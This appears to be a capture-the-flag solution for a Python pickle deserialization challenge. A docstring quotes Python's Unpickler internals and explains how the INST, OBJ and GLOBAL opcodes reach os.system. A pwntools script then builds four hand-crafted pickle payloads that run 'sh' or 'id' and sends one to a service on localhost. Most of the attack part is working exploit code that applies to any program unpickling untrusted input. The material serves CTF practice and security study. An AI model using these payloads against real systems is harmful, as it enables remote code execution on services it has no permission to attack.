'''
    # INST and OBJ differ only in how they get a class object.  It's not
    # only sensible to do the rest in a common routine, the two routines
    # previously diverged and grew different bugs.
    # klass is the class to instantiate, and k points to the topmost mark
    # object, following which are the arguments for klass.__init__.
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, "__getinitargs__")):
            try:
                value = klass(*args)
            except TypeError as err:
                raise TypeError("in constructor for %s: %s" %
                                (klass.__name__, str(err)), err.__traceback__)
        else:
            value = klass.__new__(klass)
        self.append(value)

    def load_inst(self):
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())
    dispatch[INST[0]] = load_inst

    def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
-    dispatch[OBJ[0]] = load_obj

    def load_global(self):
        module = self.readline()[:-1].decode("utf-8")
        name = self.readline()[:-1].decode("utf-8")
        klass = self.find_class(module, name)
        self.append(klass)
    dispatch[GLOBAL[0]] = load_global

    
    def load_reduce(self):
        stack = self.stack
        args = stack.pop()
        func = stack[-1]
        stack[-1] = func(*args)
    dispatch[REDUCE[0]] = load_reduce


we can achieve rce with a combination of :

    => _instantiate()
    => find_class

    
2 different solutions:
    - using INST
    - using OBJ + GLOBAL : we need obj to use _instantiate which would load the class instance, 
                           otherwise global will just call the attribute without loading it
'''
#!/usr/bin/python3
from pwn import *

# using GLOBAL + OBJ + SHORT_BINSTRING
payload = b'('              # MARK (needed for OBJ b'o')
payload += b'cos\nsystem\n' # GLOBAL (find attribute system from module os) 
payload += b'U\x02sh'       # SHORT_BINSTRING
payload += b'o'             # OBJ (build obj and push class instance)
payload += b'.'             # STOP (needed for end of stack)

# using INST + SHORT_BINSTRING
payload = b"(" 
payload += b"U\x02sh"
payload += b"ios\nsystem\n."

# using GLOBAL + OBJ + SHORT_BINUNICODE
payload = b'('              # MARK (needed for OBJ b'o')
payload += b'cos\nsystem\n' # GLOBAL (find attribute system from module os) 
payload += b'\x8c\x02sh'    # SHORT_BINUNICODE
payload += b'o'             # OBJ (build obj and push class instance)
payload += b'.'             # STOP (needed for end of stack)

# using INST + SHORT_BINUNICODE
payload = b"(" 
payload += b"\x8c\x02id"
payload += b"ios\nsystem\n."

print("Length: "+str(len(payload)))

p=binascii.hexlify(payload).decode('utf-8')

conn = remote('localhost', 1458)
print(conn.recvuntil(b'Gimme pickles: '))
conn.sendline(p.encode())
x=conn.recvline()
print(x)
if 'user' in str(x):
    print(x)
else:
    print('noo')
